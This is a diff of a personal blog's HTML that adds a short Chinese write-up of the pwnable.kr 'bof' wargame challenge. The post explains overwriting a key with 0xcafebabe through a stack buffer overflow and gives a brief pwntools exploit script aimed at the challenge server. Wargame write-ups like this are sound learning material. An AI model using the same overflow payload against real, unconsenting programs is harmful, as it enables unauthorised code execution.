@@ -20,17 +20,23 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Things always start to get better after you give up">
-<meta property="og:type" content="website">
-<meta property="og:title" content="XiaoHong">
-<meta property="og:url" content="http://example.com/archives/2020/10/index.html">
+  <meta name="description" content="查看给出的c语言源代码  显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。 IDA32打开文件  编写python脚本123456from pwn import *io &#x3D; remote(&amp;#x27;pwnable.kr&amp;#x27;,9000)payload &#x3D; &amp;#x27;a&amp;#x27;*0x2C + &amp;#x27;junk&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bof">
+<meta property="og:url" content="http://example.com/2020/10/15/bof/index.html">
 <meta property="og:site_name" content="XiaoHong">
-<meta property="og:description" content="Things always start to get better after you give up">
+<meta property="og:description" content="查看给出的c语言源代码  显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。 IDA32打开文件  编写python脚本123456from pwn import *io &#x3D; remote(&amp;#x27;pwnable.kr&amp;#x27;,9000)payload &#x3D; &amp;#x27;a&amp;#x27;*0x2C + &amp;#x27;junk&amp;#">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/10/15/bof/1.png">
+<meta property="og:image" content="http://example.com/2020/10/15/bof/2.png">
+<meta property="og:image" content="http://example.com/2020/10/15/bof/3.png">
+<meta property="article:published_time" content="2020-10-15T06:33:21.000Z">
+<meta property="article:modified_time" content="2020-10-15T06:35:20.000Z">
 <meta property="article:author" content="Xiaohong">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/10/15/bof/1.png">
 
-<link rel="canonical" href="http://example.com/archives/2020/10/">
+<link rel="canonical" href="http://example.com/2020/10/15/bof/">
 
 
 <script id="page-configurations">
@@ -38,12 +44,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Archive | XiaoHong</title>
+  <title>bof | XiaoHong</title>
   
 
 
@@ -141,70 +147,85 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">Um..! 2 posts in total. Keep on posting.</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/15/bof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/69063618?s=460&u=11199d69e5551ba91c0709fae0a30a592ab1271b&v=4">
+      <meta itemprop="name" content="Xiaohong">
+      <meta itemprop="description" content="Things always start to get better after you give up">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="XiaoHong">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bof
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-10-15 14:33:21 / Modified: 14:35:20" itemprop="dateCreated datePublished" datetime="2020-10-15T14:33:21+08:00">2020-10-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2020</span>
-    </div>
+        <img src="/2020/10/15/bof/1.png" alt="image-20201012224340251" style="zoom:33%;">
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><img src="/2020/10/15/bof/2.png" alt="image-20201012225056912" style="zoom:33%;">
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-10-15T14:33:21+08:00"
-              content="2020-10-15">
-          10-15
-        </time>
-      </div>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><img src="/2020/10/15/bof/3.png" alt="image-20201012232356510" style="zoom:33%;">
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/10/15/bof/" itemprop="url">
-            <span itemprop="name">bof</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-10-15T10:15:00+08:00"
-              content="2020-10-15">
-          10-15
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/10/15/passcode/" itemprop="url">
-            <span itemprop="name">passcode</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
     </div>
-  </div>
-  
-  
-  
 
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/15/passcode/" rel="prev" title="passcode">
+      <i class="fa fa-chevron-left"></i> passcode
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
   
 
 
@@ -257,6 +278,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%BB%99%E5%87%BA%E7%9A%84c%E8%AF%AD%E8%A8%80%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.</span> <span class="nav-text">查看给出的c语言源代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA32%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">IDA32打开文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E5%86%99python%E8%84%9A%E6%9C%AC"><span class="nav-number">3.</span> <span class="nav-text">编写python脚本</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
